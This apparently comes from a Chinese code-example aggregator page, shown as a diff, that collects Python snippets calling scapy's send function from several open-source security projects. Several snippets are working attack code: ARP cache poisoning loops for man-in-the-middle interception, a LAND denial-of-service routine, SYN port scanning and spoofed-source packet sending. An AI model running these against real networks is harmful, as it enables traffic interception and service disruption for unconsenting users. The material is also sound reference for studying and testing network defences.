@@ -1,0 +1,611 @@
+示例1: restore
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def restore(self, delay, target_b=None):
+        """ reset arp cache of the target and the router (AP) """
+        if not target_b:
+            target_b = self.gateway
+        source_mac = utils.get_mac_by_ip(target_b)
+        sock = socket(PF_PACKET, SOCK_RAW)
+        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
+        if not isinstance(self.target, list):
+            target_mac = utils.get_mac_by_ip(self.target)
+            for _ in xrange(6):
+                sock.send(str(utils.build_arp_packet(target_mac, target_b, self.target)))
+                sock.send(str(utils.build_arp_packet(source_mac, self.target, target_b)))
+        else:
+            for addr in self.target:
+                target_mac = utils.get_mac_by_ip(addr)
+                for _ in xrange(6):
+                    sock.send(str(utils.build_arp_packet(target_mac, target_b, addr)))
+                    sock.send(str(utils.build_arp_packet(source_mac, addr, target_b))) 
+开发者ID:codepr，项目名称:creak，代码行数:20，代码来源:mitm.py
+
+
+
+ 
+示例2: poison
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def poison():
+    v = scapy.ARP(pdst=target, psrc=gateway)
+    while True:
+        try:
+            scapy.send(v,verbose=0,inter=1,loop=1)
+        except KeyboardInterupt:
+            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
+            sys.exit(3) 
+开发者ID:ivanvza，项目名称:arpy，代码行数:10，代码来源:arpy.py
+
+
+示例3: gw_poison
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def gw_poison():
+    gw = scapy.ARP(pdst=gateway, psrc=target)
+    while True:
+        try:
+            scapy.send(gw,verbose=0,inter=1,loop=1)
+        except KeyboardInterrupt:
+            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
+            sys.exit(3) 
+开发者ID:ivanvza，项目名称:arpy，代码行数:10，代码来源:arpy.py
+
+
+
+ 
+示例4: run
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def run(self, state, pkt, wait,timeout=None):
+        """Send pkt, receive the answer if wait is True, and return a tuple
+        (validity of reply packet, reply packet). If no test function is
+        given, assume it's valid."""
+        self.dbgshow(pkt)
+        if wait: # do we wait for a reply ?
+            self.debug("Waiting for packet...", level=2)
+            if pkt is None:
+                timeout, buffermode = None, False
+                if type(wait) is tuple:
+                    wait, timeout, buffermode = wait
+                    #print wait
+                    #wait, buffermode = wait
+                if hasattr(wait, '__call__'):
+                    ans = self.waitForPacket(filterfct=wait, timeout=timeout)
+#                     if buffermode: # ans is a buffer (list)
+#                         self.debug("Entering buffer mode.", level=1)
+#                         return [self.packetReceived(pkt,buffermode=True) for pkt in ans]
+                else:
+                    raise Exception("error, no packet generated.")
+            else:
+                #TODO: Make sure this waits continuously in a non blocking mode, convert this to dumping from a queue
+                ans=sr1(pkt)
+        else:
+            send(pkt)
+            #print pkt
+            self.first = True # prev_pkt shouldnt be taken into account
+            self.debug("Packet sent, no waiting, going on with next.",2)
+            return (True, None) # no reply, no check
+        return self.packetReceived(ans) # post-reply actions 
+开发者ID:Neohapsis，项目名称:mptcp-abuse，代码行数:32，代码来源:core.py
+
+
+示例5: dbgshow
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def dbgshow(self, pkt):
+        if self.conf["debug"] >= 5:
+            if not pkt:
+                self.debug("No packet to send.",level=5)
+                return
+            print("------- TO SEND -------")
+            pkt.show2()
+            print("---- END of PACKET ----") 
+开发者ID:Neohapsis，项目名称:mptcp-abuse，代码行数:10，代码来源:core.py
+
+
+
+ 
+示例6: generate
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def generate(self, state, timeout=None):
+        """Describe the packet to send for the class's packet type"""
+        pass 
+开发者ID:Neohapsis，项目名称:mptcp-abuse，代码行数:5，代码来源:core.py
+
+
+示例7: _syn_scan_thread_helper
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def _syn_scan_thread_helper(self):
+
+        while True:
+
+            time.sleep(1)
+
+            if not self._host_state.is_inspecting():
+                continue
+
+            # Build a random list of (ip, port).
+            port_list = get_port_list()
+            ip_list = self._host_state.ip_mac_dict.keys()
+            ip_port_list = list(itertools.product(ip_list, port_list))
+            random.shuffle(ip_port_list)
+
+            if len(ip_list) == 0:
+                continue
+
+            utils.log('[SYN Scanning] Start scanning {} ports over IPs: {}'.format(
+                len(port_list),
+                ', '.join(ip_list)
+            ))
+
+            for (ip, port) in ip_port_list:
+
+                time.sleep(0.01)
+
+                syn_pkt = sc.IP(dst=ip) / \
+                    sc.TCP(dport=port, sport=SYN_SCAN_SOURCE_PORT, flags="S", seq=SYN_SCAN_SEQ_NUM)
+                sc.send(syn_pkt, verbose=0)
+
+                with self._lock:
+                    if not self._active:
+                        return 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:36，代码来源:syn_scan.py
+
+
+示例8: _arp_spoof
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def _arp_spoof(self, victim_mac, victim_ip, whitelist_ip_mac):
+        """Sends out spoofed packets for a single target."""
+
+        with self._host_state.lock:
+            spoof_arp = self._host_state.spoof_arp
+
+        for dest_ip, dest_mac in whitelist_ip_mac:
+
+            if victim_ip == dest_ip:
+                continue
+
+            dest_arp = sc.ARP()
+            dest_arp.op = 2
+            dest_arp.psrc = victim_ip
+            dest_arp.hwdst = dest_mac
+            dest_arp.pdst = dest_ip
+            if not spoof_arp:
+                dest_arp.hwsrc = victim_mac
+                utils.log('[Arp Spoof] Restoring', victim_ip, '->', dest_ip)
+
+            victim_arp = sc.ARP()
+            victim_arp.op = 2
+            victim_arp.psrc = dest_ip
+            victim_arp.hwdst = victim_mac
+            victim_arp.pdst = victim_ip
+            if not spoof_arp:
+                victim_arp.hwsrc = dest_mac
+                utils.log('[Arp Spoof] Restoring', dest_ip, '->', victim_ip)
+
+            sc.send(victim_arp, verbose=0)
+            sc.send(dest_arp, verbose=0) 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:33，代码来源:arp_spoof.py
+
+
+示例9: spoof
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+# Restore mac address in arp table 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:10，代码来源:arp_spoofing.py
+
+
+示例10: restore
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def restore(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False) 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:8，代码来源:arp_spoofing.py
+
+
+示例11: run
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def run(self):
+        """Sends ICMPv6 echo request packets marked with the data upribox to the
+        IPv6 all nodes multicast address.
+        Received echo replies are processed by a SniffThread.
+        """
+        while True:
+            send(IPv6(dst=self._MULTICAST_DEST) / ICMPv6EchoRequest(data=self._DATA), iface=self.interface)
+            time.sleep(self._SLEEP) 
+开发者ID:usableprivacy，项目名称:upribox，代码行数:10，代码来源:misc_thread.py
+
+
+示例12: restore
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def restore(self):
+        """
+        Restores the IP tables of the target and the router
+        to the default state (before ARP spoof attack)
+        """
+
+        colors.info('Restoring IP tables')
+
+        target_arp_packet = scapy.ARP(op=2, pdst=self.target_ip,
+                                      hwdst=self.target_mac,
+                                      psrc=self.router_ip,
+                                      hwsrc=self.router_mac)
+
+        router_arp_packet = scapy.ARP(op=2, pdst=self.router_ip,
+                                      hwdst=self.router_mac,
+                                      psrc=self.target_ip,
+                                      hwsrc=self.target_mac)
+
+        COUNT = 10  # Send 10 packets to restore
+
+        while COUNT > 0:
+            scapy.send(target_arp_packet, verbose=False)
+            scapy.send(router_arp_packet, verbose=False)
+            COUNT = COUNT - 1
+
+        colors.success('ARP Table restored') 
+开发者ID:abhisharma404，项目名称:vault，代码行数:28，代码来源:arp_spoofer.py
+
+
+示例13: startSpoof
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def startSpoof(self):
+        """
+        Starts ARP spoofing
+        """
+
+        t1 = time.time()
+
+        colors.info('ARP Spoofing started...')
+        colors.info('Press CTRL+C to exit...')
+
+        try:
+            while True:
+                target_arp_packet, router_arp_packet = self.generatePacket()
+                scapy.send(target_arp_packet, verbose=False)
+                scapy.send(router_arp_packet, verbose=False)
+                self.no_of_packets = self.no_of_packets + 1
+                print('[+] Packets sent : {}'.format(self.no_of_packets),
+                      end='\r')
+                time.sleep(self.INTER)
+
+        except KeyboardInterrupt:
+            colors.info('Stopping ARP spoof')
+
+        except Exception as e:
+            print(e)
+
+        finally:
+            self.restore()
+            t2 = time.time()
+            colors.success('ARP Spoof completed in : {}'.format(t2-t1)) 
+开发者ID:abhisharma404，项目名称:vault，代码行数:32，代码来源:arp_spoofer.py
+
+
+示例14: mac_getter
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def mac_getter(self, IP):
+
+        # Sending ARP for take the MAC address
+        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.2)
+
+        for send, receive in ans:
+            return receive.sprintf(r"%Ether.src%") 
+开发者ID:ffmancera，项目名称:pentesting-multitool，代码行数:9，代码来源:mitm_utility.py
+
+
+示例15: ARPing
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def ARPing(self):
+
+        victimMAC = self.mac_getter(self.victimIP)
+        AP_MAC = self.mac_getter(self.gatewayIP)
+
+        # Creating and sending ARP packets for try to hide the attack
+        send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=AP_MAC), count=10)
+        send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=10)
+
+        # Disabling IP Forwarding
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+        exit() 
+开发者ID:ffmancera，项目名称:pentesting-multitool，代码行数:15，代码来源:mitm_utility.py
+
+
+示例16: sending_arp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def sending_arp(self):
+
+        victim = self.mac_getter(self.victimIP)
+        AP_MAC = self.mac_getter(self.gatewayIP)
+
+        # Those replies places us between them (ARP Spoofing)
+        send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst=victim))
+        send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst=AP_MAC)) 
+开发者ID:ffmancera，项目名称:pentesting-multitool，代码行数:10，代码来源:mitm_utility.py
+
+
+示例17: send_packet
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def send_packet(protocol=None, src_ip=None, src_port=None, flags=None, dst_ip=None, dst_port=None, iface=None):
+    """Modify and send an IP packet."""
+    if protocol == 'tcp':
+        packet = IP(src=src_ip, dst=dst_ip)/TCP(flags=flags, sport=src_port, dport=dst_port)
+    elif protocol == 'udp':
+        if flags: raise Exception(" Flags are not supported for udp")
+        packet = IP(src=src_ip, dst=dst_ip)/UDP(sport=src_port, dport=dst_port)
+    else:
+        raise Exception("Unknown protocol %s" % protocol)
+
+    send(packet, iface=iface) 
+开发者ID:PacktPublishing，项目名称:Python-Network-Programming-Cookbook-Second-Edition，代码行数:13，代码来源:8_5_modify_ip_in_a_packet.py
+
+
+示例18: send
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def send(self):
+        return sendp(self.data, iface=MONITOR_INTERFACE, verbose=False)
+
+
+# 802.11 frame class with support for adding MSDUs to a single MPDU 
+开发者ID:rpp0，项目名称:aggr-inject，代码行数:7，代码来源:packets.py
+
+
+示例19: poison
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def poison(self, delay, target_b=None):
+        """
+        poison arp cache of target and router, causing all traffic between them to
+        pass inside our machine, MITM heart
+        """
+        if not target_b:
+            target_b = self.gateway
+        utils.set_ip_forward(1)
+        sock = socket(PF_PACKET, SOCK_RAW)
+        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
+        try:
+            while True:
+                if self.debug:
+                    log.info('[+] %s <-- %s -- %s -- %s --> %s',
+                             target_b, self.target, self.dev, target_b, self.target)
+                    if not isinstance(self.target, list):
+                        sock.send(str(utils.build_arp_packet(
+                            self.src_mac, target_b, self.target)))
+                        sock.send(str(utils.build_arp_packet(
+                            self.src_mac, self.target, target_b)))
+                        time.sleep(delay) # OS refresh ARP cache really often
+                    else:
+                        for addr in self.target:
+                            sock.send(str(utils.build_arp_packet(self.src_mac, target_b, addr)))
+                            sock.send(str(utils.build_arp_packet(self.src_mac, addr, target_b)))
+                        time.sleep(delay) # OS refresh ARP cache really often
+
+        except KeyboardInterrupt:
+            print('\n\r[+] Poisoning interrupted')
+            sock.close() 
+开发者ID:codepr，项目名称:creak，代码行数:32，代码来源:mitm.py
+
+
+示例20: sendpkt
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def sendpkt(self, newpkt, initstate=None, timeout=None, waitAck=None, **kargs):
+        """Generate and send a new packet
+
+        Generate a new packet using the function newpkt, from existing current
+        state overriden by initstate, then send it.
+        Return a tuple (sent packet, reply, new state)
+
+        Arguments:
+        newpkt -- function to generate the scapy packet to send. It must have
+                  at least have a state dictionnary as first parameter
+        initstate -- state overriding the current state.
+        testfct -- optional function used to check the validity of a reply
+        kargs -- other optional arguments to be passed to the newpkt function
+        """
+        if self.state is None:
+            if initstate is None:
+                # If no initial state is given at the first call, use a generic one
+                self.state = ProtoState()
+            else:
+                self.state = initstate
+        else:
+            self.state.update(initstate)
+        s = self.state # simple alias
+
+        if self.first:
+            self.first = False
+#        elif not s.getLastPacket():
+#            raise Exception("no previous packet, can't resume the protocol")
+
+        try:
+            (pkt, wait) = newpkt().generate(s, timeout=timeout, **kargs)
+
+            if s.hasKey("stage") and pkt is not None:
+                self.debug("Generating %s packet..." % s["stage"], 2)
+            r = self.run(s, pkt, wait)
+            if type(r) is list: # buffermode
+                return r
+            # otherwise, it's a classic (validity, reply) tuple
+            (ret, reply) = r
+
+        except PktWaitTimeOutException as e:
+            raise e
+#PktWaitTimeOutException(e.
+        except Exception as e:
+            import sys
+            if self.conf["debug"]:
+                import traceback
+                traceback.print_exc(file=sys.stdout)
+            print("Error: %s" % e)
+            print("Exiting.")
+            sys.exit(0)
+
+        return (pkt, ret, reply, self.state) 
+开发者ID:Neohapsis，项目名称:mptcp-abuse，代码行数:55，代码来源:core.py
+
+
+示例21: cmd_land
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def cmd_land(ip, count, port, iface, verbose):
+    """This command implements the LAND attack, that sends packets forging the
+    source IP address to be the same that the destination IP. Also uses the
+    same source and destination port.
+
+    The attack is very old, and can be used to make a Denial of Service on
+    old systems, like Windows NT 4.0. More information here:
+    https://en.wikipedia.org/wiki/LAND
+
+    \b
+    # sudo habu.land 172.16.0.10
+    ............
+
+    Note: Each dot (.) is a sent packet. You can specify how many
+    packets send with the '-c' option. The default is never stop. Also, you
+    can specify the destination port, with the '-p' option.
+    """
+
+    conf.verb = False
+
+    if iface:
+        iface = search_iface(iface)
+        if iface:
+            conf.iface = iface['name']
+        else:
+            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            return False
+
+    layer3 = IP()
+    layer3.dst = ip
+    layer3.src = ip
+
+    layer4 = TCP()
+    layer4.dport = port
+    layer4.sport = port
+
+    pkt = layer3 / layer4
+
+    counter = 0
+
+    while True:
+        send(pkt)
+        counter += 1
+
+        if verbose:
+            print(pkt.summary())
+        else:
+            print('.', end='')
+            sys.stdout.flush()
+
+        if count != 0 and counter == count:
+            break
+
+    return True 
+开发者ID:fportantier，项目名称:habu，代码行数:56，代码来源:cmd_land.py
+
+
+示例22: cmd_tcp_isn
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import send [as 别名]
+def cmd_tcp_isn(ip, port, count, iface, graph, verbose):
+    """Create TCP connections and print the TCP initial sequence
+    numbers for each one.
+
+    \b
+    $ sudo habu.tcp.isn -c 5 www.portantier.com
+    1962287220
+    1800895007
+    589617930
+    3393793979
+    469428558
+
+    Note: You can get a graphical representation (needs the matplotlib package)
+    using the '-g' option to better understand the randomness.
+    """
+
+    conf.verb = False
+
+    if iface:
+        iface = search_iface(iface)
+        if iface:
+            conf.iface = iface['name']
+        else:
+            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            return False
+
+    isn_values = []
+
+    for _ in range(count):
+        pkt = IP(dst=ip)/TCP(sport=RandShort(), dport=port, flags="S")
+        ans = sr1(pkt, timeout=0.5)
+        if ans:
+            send(IP(dst=ip)/TCP(sport=pkt[TCP].sport, dport=port, ack=ans[TCP].seq + 1, flags='A'))
+            isn_values.append(ans[TCP].seq)
+            if verbose:
+                ans.show2()
+
+    if graph:
+
+        try:
+            import matplotlib.pyplot as plt
+        except ImportError:
+            print("To graph support, install matplotlib")
+            return 1
+
+        plt.plot(range(len(isn_values)), isn_values, 'ro')
+        plt.show()
+
+    else:
+
+        for v in isn_values:
+            print(v)
+
+    return True 
+开发者ID:fportantier，项目名称:habu，代码行数:56，代码来源:cmd_tcp_isn.py
